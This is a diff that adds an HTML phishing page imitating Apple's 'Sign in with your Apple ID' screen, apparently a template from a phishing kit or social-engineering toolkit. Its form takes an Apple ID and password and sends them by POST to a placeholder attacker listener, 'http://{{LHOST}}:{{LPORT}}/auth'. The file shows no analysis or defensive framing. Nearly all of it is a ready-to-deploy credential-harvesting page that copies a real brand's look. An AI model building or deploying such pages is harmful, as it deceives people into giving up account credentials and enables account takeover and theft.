@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Manage your Apple ID</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #fbfbfd; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; width: 380px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1d1d1f; margin-bottom: 30px; }
+        .input-group { background: white; border: 1px solid #d2d2d7; border-radius: 12px; overflow: hidden; margin-bottom: 20px; text-align: left; }
+        input { width: 100%; padding: 15px; border: none; border-bottom: 1px solid #d2d2d7; box-sizing: border-box; font-size: 17px; outline: none; }
+        input:last-child { border-bottom: none; }
+        button { padding: 10px 20px; background-color: #0071e3; color: white; border: none; border-radius: 20px; font-size: 14px; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #0077ed; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 style="font-size: 30px; margin: 0;"></h2>
+        <h1>Sign in with your Apple ID</h1>
+        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
+            <div class="input-group">
+                <input type="text" name="email" placeholder="Apple ID" required>
+                <input type="password" name="pass" placeholder="Password" required>
+            </div>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
